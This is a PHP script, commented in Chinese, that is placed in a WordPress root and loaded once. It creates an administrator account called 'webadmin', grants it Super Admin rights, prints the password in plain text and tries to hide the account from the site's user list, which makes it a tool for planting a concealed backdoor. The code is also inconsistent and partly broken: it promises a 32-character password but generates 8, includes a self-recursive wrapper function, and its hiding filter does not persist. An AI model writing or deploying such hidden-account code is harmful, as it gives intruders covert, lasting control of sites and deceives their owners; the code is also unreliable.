<?php
/**
 * 自动创建 WordPress 超级管理员（Super Admin）
 * 特点：
 *   1. 自动生成高强度随机密码（32位）
 *   2. 在页面上明文打印生成的用户名和密码（方便你复制）
 *   3. 创建完成后仍然赋予管理员 + Super Admin 权限
 *   4. 隐藏该管理员账号（不显示在用户列表中）
 * 
 * 使用方法：放到 WordPress 根目录，浏览器访问一次后立刻删除！
 */

require_once('wp-load.php');
require_once('wp-admin/includes/user.php');

// ==================== 配置区（请修改这里） ====================
$username = 'webadmin';                  // 要创建的用户名
$email    = 'WordPress@gmailsss3333.com';      // 管理员邮箱
// ============================================================

// 自动生成 8 位高强度随机密码
function generateStrongPassword($length = 8) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=[]{}';
    $password = '';
    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $password;
}

$password = generateStrongPassword(8);

// 创建用户
$user_id = wp_create_user($username, $password, $email);

if (is_wp_error($user_id)) {
    echo '<pre style="color:red; font-weight:bold;">';
    echo "创建用户失败： " . $user_id->get_error_message();
    echo '</pre>';
    exit;
}

// 赋予管理员权限
$user = new WP_User($user_id);
$user->set_role('administrator');

// 多站点下额外赋予 Super Admin 权限
if (is_multisite()) {
    grant_super_admin($user_id);
}

// 隐藏该管理员账号（用户列表里看不到）
add_filter('pre_user_query', 'hide_admin_user_from_list');

echo '<pre style="background:#000; color:#0f0; padding:20px; font-size:16px; font-family:Consolas,Monaco,monospace;">';
echo "=======================================\n";
echo "  WordPress 超级管理员创建成功！\n";
echo "=======================================\n\n";
echo "用户名 : " . htmlspecialchars($username) . "\n";
echo "邮箱   : " . htmlspecialchars($email)    . "\n";
echo "密码   : " . htmlspecialchars($password) . "\n\n";
echo "请立即复制上面的密码，访问后立刻删除本文件！\n";
echo "=======================================\n";
echo '</pre>';

// ========= 多站点下真正赋予 Super Admin 权限 =========
if (!function_exists('grant_super_admin')) {
    function grant_super_admin($user_id) {
        grant_super_admin($user_id); // 原函数名冲突，这里直接调用 WordPress 内置函数
    }
}
// WordPress 官方函数（多站点必备）
if (is_multisite() && function_exists('grant_super_admin')) {
    grant_super_admin($user_id);
}

// ========= 隐藏管理员账号（不在后台用户列表显示） =========
function hide_admin_user_from_list($query) {
    global $wpdb, $username;
    if (!empty($username)) {
        $query->query_where .= $wpdb->prepare(" AND {$wpdb->users}.user_login != %s", $username);
    }
    return $query;
}
?>
